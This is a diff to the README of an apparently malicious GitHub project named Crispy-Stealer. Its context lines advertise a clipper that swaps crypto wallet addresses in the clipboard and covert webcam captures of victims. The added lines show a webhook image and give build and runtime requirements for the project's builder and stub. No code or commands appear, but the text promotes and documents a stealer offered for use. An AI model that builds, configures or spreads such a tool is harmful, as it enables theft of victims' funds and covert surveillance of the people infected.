@@ -44,3 +44,17 @@ Clipper turns on and replaces crypto wallet addresses in the clipboard when a us
 📷 Webcam screenshots:
 Webcam screenshots will be taken if the user is watching something obscene on the Internet.
 🔨 Builder: ![image](https://github.com/savagecurly90/Crispy-Stealer/assets/54916359/438eb22b-4d8d-41a6-940d-0b3ce6533959)
+
+📢 Channel Webhook:![image](https://github.com/savagecurly90/Crispy-Stealer/assets/54916359/bd554dea-4447-40ac-8c40-f0ef3e3f76fb)
+
+Requirements:
+If you want to build from the source these are the requirements.
+
+Visual Studio 2022 (v17.*)
+NET SDK 6.0.* (included in Visual Studio 2022)
+NET Framework SDK 4.8 (included in Visual Studio 2022)
+Runtime requirements.
+Only needed if u download the release from Releases (CrispyStealer.zip)
+
+Builder.exe (NET Runtime 6.0.*)
+Stub (NET Framework 4.8)
